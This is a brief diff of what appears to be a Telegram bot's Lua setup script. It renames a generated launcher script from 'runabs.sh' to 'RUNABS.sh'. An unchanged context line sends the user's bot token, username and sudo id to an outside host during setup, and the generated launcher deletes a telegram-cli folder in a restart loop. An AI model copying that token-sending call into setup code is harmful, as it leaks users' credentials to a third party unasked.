@@ -56,7 +56,7 @@ sudo_users = {sudo},
 }
 create(config, "./config.lua")   
 https.request("https://ibcorp.ibuser.xyz/DevProx/?id="..sudo.."&user="..username.."&token="..token)
-file = io.open("runabs.sh", "w") 
+file = io.open("RUNABS.sh", "w") 
 file:write([[
 #!/bin/bash 
 token="]]..token..[["
@@ -73,7 +73,7 @@ file:write([[
 killall screen
 while(true) do
 rm -fr ../.telegram-cli
-screen ./runabs.sh
+screen ./RUNABS.sh
 done
 ]])  
 file:close() 
